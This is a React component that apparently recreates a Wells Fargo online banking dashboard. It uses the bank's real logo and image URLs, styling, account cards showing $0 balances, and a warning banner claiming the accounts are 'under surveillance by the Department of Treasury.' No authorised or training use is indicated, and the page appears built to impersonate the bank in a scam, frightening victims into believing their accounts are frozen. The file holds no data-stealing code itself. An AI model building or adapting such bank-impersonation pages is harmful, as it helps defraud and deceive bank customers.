import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import FooterHelp from '../components/Footer/FooterHelp';
import FooterLinks from '../components/Footer/FooterLinks';
import FooterDisclaimer from '../components/Footer/FooterDisclaimer';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function Dashboard() {
  const navigate = useNavigate();

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: f }}>
      {/* Header */}
      <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '60px', display: 'flex', alignItems: 'center' }}>
        <div className="max-w-[1400px] mx-auto w-full" style={{ padding: '0 32px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
            <img src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png" alt="Wells Fargo" style={{ height: '20px', filter: 'brightness(0) invert(1)' }} />
          </a>
          <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '22px', height: '22px', color: '#fff', cursor: 'pointer' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
            <div style={{ width: '1px', height: '28px', backgroundColor: 'rgba(255,255,255,0.4)' }} />
            <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ color: '#fff', textDecoration: 'none', fontSize: '0.88rem', display: 'flex', alignItems: 'center', gap: '6px' }} className="hover:underline">
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '16px', height: '16px' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              Sign Off
            </a>
            <div style={{ width: '1px', height: '28px', backgroundColor: 'rgba(255,255,255,0.4)' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
              <div style={{ width: '36px', height: '36px', borderRadius: '50%', border: '2px solid #fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '20px', height: '20px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
              <div style={{ color: '#fff', lineHeight: '1.2' }}>
                <div style={{ fontSize: '0.76rem' }}>Welcome</div>
                <div style={{ fontSize: '0.88rem', fontWeight: 600 }}>AB</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '14px', height: '14px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </div>
        </div>
      </header>

      {/* Main content area */}
      <div style={{ backgroundColor: '#f2f2f2', flex: 1 }}>
        <div className="max-w-[960px] mx-auto" style={{ padding: '32px 20px 40px' }}>
          {/* Account Summary */}
          <h1 style={{ fontFamily: f, fontSize: '1.76rem', fontWeight: 300, fontStyle: 'italic', color: '#141414', margin: '0 0 24px' }}>
            Account Summary
          </h1>

          {/* Warning banner */}
          <div style={{ backgroundColor: '#FFF3CD', border: '1px solid #F0E0A0', borderRadius: '4px', padding: '14px 20px', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '12px' }}>
            <span style={{ fontSize: '1.2rem' }}>⚠️</span>
            <span style={{ fontFamily: f, fontSize: '0.94rem', color: '#664D03' }}>
              Accounts under surveillance by the Department of Treasury.
            </span>
          </div>

          {/* Everyday Checking */}
          <AccountCard title="EVERYDAY CHECKING" balance="$0" />
          {/* Investment */}
          <AccountCard title="INVESTMENT" balance="$0" />

          {/* Quick Actions */}
          <div style={{ marginBottom: '32px', marginTop: '8px' }}>
            <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
              {['Transfer & Pay', 'Deposit', 'Pay Bills', 'Wire Transfer', 'Zelle'].map((action) => (
                <a key={action} href="#" style={{
                  backgroundColor: '#fff', border: '1px solid #b5adad', borderRadius: '24px',
                  padding: '8px 20px', fontSize: '0.82rem', fontFamily: f, color: '#5a469b',
                  textDecoration: 'none', fontWeight: 600,
                }} className="hover:underline">
                  {action}
                </a>
              ))}
            </div>
          </div>

          {/* Promo cards row */}
          <div style={{ backgroundColor: '#fff', borderRadius: '4px', boxShadow: '0 1px 3px rgba(0,0,0,0.1)', display: 'flex', overflow: 'hidden', marginBottom: '32px' }}>
            <div style={{ flex: 1, padding: '24px 20px', borderRight: '1px solid #e2dede' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Find a credit card</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>Choose from cash rewards low intro rate and more.</p>
            </div>
            <div style={{ flex: 1, padding: '24px 20px', borderRight: '1px solid #e2dede' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Stock Fractions</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>Start investing with just $10</p>
            </div>
            <div style={{ flex: 1, padding: '24px 20px' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Invest and bank</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>All in one place - the Wells Fargo Mobile app</p>
            </div>
          </div>
        </div>

        {/* Security & Fraud Alert Banner */}
        <div style={{ backgroundColor: '#1a1a2e' }}>
          <div className="max-w-[960px] mx-auto" style={{ padding: '32px 20px', display: 'flex', alignItems: 'center', gap: '24px' }}>
            <div style={{ flexShrink: 0 }}>
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '48px', height: '48px', color: '#FFCD41' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
            </div>
            <div>
              <h3 style={{ fontFamily: f, fontSize: '1.17rem', fontWeight: 600, color: '#fff', margin: '0 0 6px' }}>
                Security Center
              </h3>
              <p style={{ fontFamily: f, fontSize: '0.88rem', color: '#ccc', margin: 0, lineHeight: '1.4' }}>
                Protect yourself from fraud. Review your recent activity, set up alerts, and learn how to keep your accounts safe.
              </p>
            </div>
            <a href="#" style={{
              backgroundColor: '#FFCD41', color: '#141414', borderRadius: '24px',
              padding: '9px 28px', fontFamily: f, fontWeight: 600, fontSize: '0.88rem',
              textDecoration: 'none', whiteSpace: 'nowrap', flexShrink: 0,
            }}>
              Review Activity
            </a>
          </div>
        </div>

        {/* Financial Tools Section */}
        <div style={{ backgroundColor: '#fff' }}>
          <div className="max-w-[960px] mx-auto" style={{ padding: '40px 20px' }}>
            <h2 style={{ fontFamily: f, fontSize: '1.41rem', fontWeight: 300, fontStyle: 'italic', color: '#141414', margin: '0 0 24px' }}>
              Financial Tools
            </h2>
            <div style={{ display: 'flex', gap: '16px' }}>
              {[
                { icon: '📊', title: 'Spending Summary', desc: 'See where your money goes each month with spending insights by category.' },
                { icon: '🎯', title: 'Financial Goals', desc: 'Set savings goals and track your progress over time.' },
                { icon: '📱', title: 'Mobile Banking', desc: 'Bank on the go with the Wells Fargo Mobile app. Deposit checks, pay bills, and more.' },
                { icon: '🔔', title: 'Account Alerts', desc: 'Set up email or text alerts for transactions, low balances, and more.' },
              ].map((tool) => (
                <div key={tool.title} style={{
                  flex: 1, backgroundColor: '#f9f7f6', borderRadius: '8px', padding: '24px 20px',
                }}>
                  <div style={{ fontSize: '2rem', marginBottom: '12px' }}>{tool.icon}</div>
                  <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>{tool.title}</h3>
                  <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>{tool.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Fargo Assistant Banner */}
        <div style={{ background: 'linear-gradient(135deg, #4a3728 0%, #3b3331 40%, #2a2a2a 100%)' }}>
          <div className="max-w-[960px] mx-auto" style={{ padding: '40px 20px', display: 'flex', alignItems: 'center', gap: '32px' }}>
            <div style={{ flex: 1 }}>
              <h2 style={{ fontFamily: f, fontSize: '1.41rem', color: '#fff', fontWeight: 400, margin: '0 0 12px' }}>
                Need help? Ask Fargo<sup style={{ fontSize: '0.7em' }}>&reg;</sup>
              </h2>
              <p style={{ fontFamily: f, fontSize: '0.94rem', color: '#ccc', margin: '0 0 20px', lineHeight: '1.4' }}>
                Get valuable insights like a summary of your spending by category, retailer and across accounts.
              </p>
              <div style={{ display: 'flex', gap: '12px' }}>
                <a href="#"><img src="https://www17.wellsfargomedia.com/assets/images/rwd/App_Store_Badge.png" alt="" style={{ height: '36px' }} /></a>
                <a href="#"><img src="https://www17.wellsfargomedia.com/assets/images/rwd/GooglePlay_Badge.png" alt="" style={{ height: '36px' }} /></a>
              </div>
            </div>
            <img
              src="https://www17.wellsfargomedia.com/assets/images/rwd/Fargo-Spending-Insights-Wells-Fargo-Mobile-App-2025.png"
              alt="" style={{ height: '280px', objectFit: 'contain' }}
            />
          </div>
        </div>

        {/* Offers & Promotions */}
        <div style={{ backgroundColor: '#f9f7f6' }}>
          <div className="max-w-[960px] mx-auto" style={{ padding: '40px 20px' }}>
            <h2 style={{ fontFamily: f, fontSize: '1.41rem', fontWeight: 300, fontStyle: 'italic', color: '#141414', margin: '0 0 24px' }}>
              Offers for You
            </h2>
            <div style={{ display: 'flex', gap: '16px' }}>
              <div style={{ flex: 1, backgroundColor: '#fff', borderRadius: '10px', boxShadow: '0 1px 5px rgba(0,0,0,0.1)', overflow: 'hidden' }}>
                <img src="https://www17.wellsfargomedia.com/mkt/marketing/digital-containers/images/616x353/wfi_ph_g_1263166552-protecting_hpsp_616x353.jpg" alt="" style={{ width: '100%', height: '160px', objectFit: 'cover' }} />
                <div style={{ padding: '16px 20px' }}>
                  <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Protect what matters</h3>
                  <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: '0 0 12px', lineHeight: '1.4' }}>Learn about identity theft protection and fraud monitoring services.</p>
                  <a href="#" style={{ color: '#5a469b', fontSize: '0.82rem', fontFamily: f }} className="hover:underline">Learn more &gt;</a>
                </div>
              </div>
              <div style={{ flex: 1, backgroundColor: '#fff', borderRadius: '10px', boxShadow: '0 1px 5px rgba(0,0,0,0.1)', overflow: 'hidden' }}>
                <img src="https://www17.wellsfargomedia.com/mkt/marketing/digital-containers/images/616x353/wfi_ph_g_1184079607-financialgoals_hpsp_616x353.jpg" alt="" style={{ width: '100%', height: '160px', objectFit: 'cover' }} />
                <div style={{ padding: '16px 20px' }}>
                  <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Your financial goals</h3>
                  <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: '0 0 12px', lineHeight: '1.4' }}>Start crafting the foundation for the future you see yourself in.</p>
                  <a href="#" style={{ color: '#5a469b', fontSize: '0.82rem', fontFamily: f }} className="hover:underline">Get started &gt;</a>
                </div>
              </div>
              <div style={{ flex: 1, backgroundColor: '#fff', borderRadius: '10px', boxShadow: '0 1px 5px rgba(0,0,0,0.1)', overflow: 'hidden' }}>
                <img src="https://www17.wellsfargomedia.com/assets/images/contextual/responsive/smlpromo/wfi_ph_hpsp_fsalockup_616x353.jpg" alt="" style={{ width: '100%', height: '160px', objectFit: 'cover' }} />
                <div style={{ padding: '16px 20px' }}>
                  <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Fraud &amp; Scam Alert</h3>
                  <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: '0 0 12px', lineHeight: '1.4' }}>Spot the latest tactics scammers are using and stay protected.</p>
                  <a href="#" style={{ color: '#5a469b', fontSize: '0.82rem', fontFamily: f }} className="hover:underline">Stay updated &gt;</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Full Footer */}
      <FooterHelp />
      <FooterLinks />
      <FooterDisclaimer />
    </div>
  );
}

function AccountCard({ title, balance }: { title: string; balance: string }) {
  const [expanded, setExpanded] = useState(false);
  const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

  return (
    <div
      onClick={() => setExpanded(!expanded)}
      style={{
        backgroundColor: '#fff', borderRadius: '4px', marginBottom: '16px',
        boxShadow: '0 1px 3px rgba(0,0,0,0.1)', overflow: 'hidden',
        cursor: 'pointer', transition: 'box-shadow 0.2s',
      }}
      className="hover:shadow-md"
    >
      <div style={{ display: 'flex', alignItems: 'stretch' }}>
        <div style={{ width: '4px', backgroundColor: '#D71E28', flexShrink: 0 }} />
        <div style={{ flex: 1, padding: '24px 20px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <h2 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 700, color: '#D71E28', margin: 0, letterSpacing: '0.5px' }}>{title}</h2>
          <div style={{ textAlign: 'right' }}>
            <div style={{ fontFamily: f, fontSize: '1.29rem', fontWeight: 400, color: '#141414' }}>{balance}</div>
            <div style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070' }}>Available balance</div>
          </div>
        </div>
        <div
          onClick={(e) => { e.stopPropagation(); setExpanded(!expanded); }}
          style={{ width: '40px', backgroundColor: '#1a1a2e', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer', flexShrink: 0 }}
        >
          <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '20px', height: '20px', color: '#fff' }} fill="currentColor" viewBox="0 0 24 24">
            <circle cx="12" cy="5" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="12" cy="19" r="2" />
          </svg>
        </div>
      </div>
      {expanded && (
        <div style={{ display: 'flex', alignItems: 'stretch', borderTop: '1px solid #e2dede' }}>
          <div style={{ width: '4px', backgroundColor: '#D71E28', flexShrink: 0 }} />
          <div style={{ flex: 1, padding: '20px', fontFamily: f, fontSize: '1rem', color: '#787070', fontStyle: 'italic' }}>
            No transactions available.
          </div>
        </div>
      )}
    </div>
  );
}
